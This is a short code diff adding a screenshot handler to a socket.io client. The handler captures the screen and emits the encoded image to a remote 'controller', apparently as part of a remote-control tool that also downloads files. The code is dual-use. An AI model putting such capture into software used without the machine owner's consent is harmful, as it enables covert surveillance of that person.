@@ -154,6 +154,38 @@ def download_file(data):
             }
         )
 
+# Screenshot capture
+
+from file_transfer import FileTransfer
+
+@sio.event
+def screenshot(data):
+    
+    try:
+         
+        encoded_screenshot = FileTransfer.capture_screenshot()
+        
+        sio.emit(
+            "screenshot_result",
+            {
+                "controller_sid" :  data["controller_sid"],
+                "status" : "success",
+                "image_data" : encoded_screenshot
+            }
+        )
+        
+    except Exception as e:
+        
+        sio.emit(
+            "screenshot_result",
+            {
+                "controller_sid" :  data["controller_sid"],
+                "status" : "error",
+                "message" : str(e)
+            }
+        )
+
+
 # server connection 
 
 @sio.event
